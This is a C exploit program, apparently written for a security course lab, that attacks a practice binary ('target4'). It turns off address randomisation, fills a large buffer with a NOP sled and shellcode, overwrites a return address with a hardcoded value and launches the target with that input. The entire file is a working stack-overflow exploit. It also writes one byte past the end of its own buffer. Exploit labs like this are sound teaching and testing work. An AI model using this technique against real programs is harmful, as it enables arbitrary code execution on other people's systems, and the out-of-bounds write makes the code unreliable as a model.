#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/personality.h>

/* Change to shellcode.h if you want a shell */
#include "shellcode.h"
#define TARGET "../targets/target4"
#define BUFLEN 96
#define SHORT_OVERFLOW 0x8000

int main(void)
{
  /* Setup code to make sure your target runs without ASLR and has an
     executable stack. Don't change this.*/
  personality(ADDR_NO_RANDOMIZE |READ_IMPLIES_EXEC);

  char *args[3];
  char *env[1];

  char buf[SHORT_OVERFLOW];
  memset(buf, 0x90, SHORT_OVERFLOW);
  memcpy(buf, shellcode, sizeof(shellcode)-1);

  *(unsigned int*)(buf + BUFLEN + 8) = 0xffff5dc4;
  buf[SHORT_OVERFLOW] = '\0';

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    perror("execve failed");

  return 0;
}
